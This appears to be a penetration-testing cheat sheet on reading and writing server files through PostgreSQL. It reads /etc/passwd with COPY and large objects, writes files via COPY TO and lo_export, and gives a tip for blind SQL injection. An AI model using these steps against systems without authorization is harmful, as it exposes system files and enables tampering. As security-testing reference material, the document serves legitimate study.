### PostgreSQL Read+Write Files
There are several ways on how we can read/write files directly from PostgreSQL, but all of them requires that the user that is running the DB on behalf of must be superuser or 
hold the  *pg_read_server_files / pg_write_server_files permission*.

1) Check current user is superuser:
```
SELECT current_setting('is_superuser');
 current_setting 
-----------------
 on
```

2)Check if a user have *pg_read_server_files / pg_write_server*_files permission
```
SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
 rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
```


# Read
1)File Read via Postgres(requires superuser or file read/write)
```
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp LIMIT 5;
```
OBS: columns might be treated as columns, to bypass this you have to use custom delimiters.
```
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
```

2)Alternative(good to bypass format syntax but it HEX encoded!)
```
SELECT lo_import('/etc/passwd');             --Import file into largeobject
 lo_import 
-----------
     16513
```

`SELECT lo_get(16513);       --Use the largeobject id to read the file`
OR
`SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;`
Lastly use xdd to decode from hex to string!
OBS: if it's a blind sqli and you can't read the largeobject id then you can guess it via: 
`SELECT DISTINCT loid FROM pg_largeobject;`



2A)File Write
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question')
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
exit;

 cat /tmp/proof.txt 
To hack, or not to hack, that is the question


# Write
1)Alternative(still using the large_object type) 
OBS: This is very awkward since the data need to be chunked in 2kb chunks before uploading....

`split -b 2048 /etc/passwd`   
(Split in 2kb chunks)
`xxd -ps -c 99999999999 xaa  `
(Convert each chunk in hex)


```
SELECT lo_create(31337);    --Create a known largeobject id
 lo_create 
-----------
     31337
	 
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));       --Insert every chunk
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));    --Insert every chunk
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
exit
(Unlink and close)

head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
```


**OBS**: if INSERT fail into pg_largeobject then you can try as well! (you must know a largeobject id!)
`SELECT lo_put(31337, 0, 'this is a test');`